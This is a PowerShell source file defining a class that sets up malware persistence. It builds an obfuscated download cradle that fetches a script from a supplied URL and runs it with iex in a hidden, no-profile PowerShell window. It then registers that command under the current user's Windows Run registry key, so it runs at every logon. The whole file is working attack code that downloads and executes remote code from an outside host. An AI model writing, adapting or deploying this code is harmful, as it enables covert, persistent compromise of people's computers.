Class ObfPersistenceExecuteScriptWeb3 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent3.ps1
        $DoAll = "SI Variable:\5U '$url';Set-Item Variable:/B (New-Object Net.WebClient);(GV B).Value.DownloadString((Variable 5U -Value))"
        
        #Make a payload from PayloadURL
        $Payload = "powershell -win hid -noP -c `"$DoAll | iex `""

        $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

        # Check if it already exists a key with the given name
        if($runKeys.$rKeyName){
            # Remove it if already exists
            Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $rKeyName
        }
        New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $rKeyName -Value $Payload

    }

}